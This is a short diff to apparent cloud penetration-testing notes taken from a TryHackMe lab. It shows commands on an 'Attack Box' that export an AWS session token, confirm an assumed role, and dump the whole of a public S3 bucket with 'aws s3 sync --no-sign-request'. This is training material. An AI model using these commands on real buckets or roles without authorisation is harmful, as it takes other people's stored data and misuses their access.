@@ -111,8 +111,15 @@ user@machine$ export AWS_SESSION_TOKEN=xxxxxxxxxxxxxxxxxxxxxxx
 user@machine$ aws sts get-caller-identity
 # this command issued on the Attack Box should show the role that was temporarily assumed
 ----------------------------------------------------------------------------------------------------------------
-Dumping public S3 Bucket
+
+Dumping a public S3 Bucket
 --------------------------
 Once a public S3 bucket is identified it can be dumped using the following command from your Attack Box:
 kali@kali$ aws s3 sync s3://{bucket-name} . --no-sign-request
 # --no-sign-request = no AWS credentials used to sign the request; works when bucket is public
+[from: https://tryhackme.com/room/awss3service ; Task 6 - "Lab: Attacking Public S3 Buckets"]
+----------------------------------------------------------------------------------------------------------------
+
+
+
+
